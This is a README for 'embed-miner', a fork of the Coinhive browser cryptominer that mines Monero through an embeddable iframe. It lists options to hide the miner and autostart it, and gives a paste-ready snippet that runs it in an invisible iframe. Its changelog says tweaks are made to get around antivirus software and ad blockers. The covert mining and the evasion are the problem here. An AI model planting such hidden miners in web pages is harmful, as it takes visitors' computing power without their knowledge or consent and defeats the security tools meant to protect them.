# embed-miner
A miner you can embed in an IFRAME.

`miner.html` uses `leat-stratum-proxy.js` on the back end and pulls `leat-mine.js` from the server to the client.

For it to work on your own server you serve the `leat-mine.js` file and run the `leat-stratum-proxy.js` file somewhere.

# Usage

The following will work as is (however it will leat.io servers unless you serve the files).

```html
    <iframe src="https://leat.io/miner.html?u=leathan" width="400px" height="300px"></iframe>
    <!-- OR EVEN: <iframe src="https://leat.io/html/miner.html?a=YOUR_MONERO_ADDRESS"></iframe> -->
```

See a live example at [https://leathan.xyz/html/iframe-miner.html](https://leathan.xyz/html/iframe-miner.html).

**Thats it!**

# Options

1.) `user` or `u` for short - mines directly to the provided leat.io user.

2.) `address` or `a` - mines directly to the provided monero address. 

3.) `hide` or `h` - hides the miner from view.

4.) `autostart` or `start` or `s` - starts the miner automatically.

5.) `color`, `text`, `background`, and `graph` - styling colors for the interface.

6.) `threads`, `throttle`, and `powermode` - configuration options for the miner.

7.) `hidelogo` or `hl` - hides the logo.

8.) `preserve` or `p` - preserves the URL.

9.) `interval` or `i` - sets a custom delay on the update redraws (default is 500ms).

10.) `ref` or `r` - links the miner to your leat.io account via ID#.

For example to start automatically and hidden as user leathan with 1 thread:

```html
<iframe src="https://leat.io/miner.html?u=leathan&t=1&h&s" style="display:none"></iframe>
```


# Changes

Since this is a coin-hive fork I will record the changes.

0.) Refactored the code.

1.) UI tweeks.

2.) Added Accepted' shares box.

3.) Added a 'Power Mode' option which makes the miner mine for only 1 minnute every PowerMode+1 minnutes.

3.) Added a hide option.

4.) Allowed direct mining to addresses (no need to use siteKeys).

5.) Changed the name of the options and the logic to get/store them

6.) Added shortcuts for all options (threads=t, throttle=th, background=bg, text=txt, color=c, graph=h, powermode=pm).

7.) Hooked up the users to leat.io such that `u=leathan` will credit leathan@leat.io.

8.) Add username to the UI.

9.) Strip all the options from the URL, in case you want to run it nativle (not in iframe).

10.) `preserve` or `p` option to not strip the commands from the URL.

11.) Automatically attempt to load options from localStorage if none are specified.

12.) Save options to localStorage.

13.) `interval` or `i` command added to throttle the two main updates (default = 500ms and default/10 (50ms))

13.) Other tweeks. (which constantly are related to getting around antivirus's/adblocker's).

# Full Installation

1.) Install [leat-stratum-proxy](https://github.com/ileatahn/leat-stratum-proxy).

2.) Install [leat-client](https://github.com/ileathan/leat-client) 

3.) For best preformance set up `leat-mine.js` as explained in the README and host `leathash.wasm`, `leathash-asmjs.min.js`, `leathash-asmjs.min.js.mem` and `leat-mine.js` on your server.

3.) Edit `miner.html` (this repository) so that the script tag includes your servers `leat-mine.js` file.
```
// In my case its
<script src="https://leat.io/lib/leat-mine.js"></script>
```


- with <3 from https://leat.io
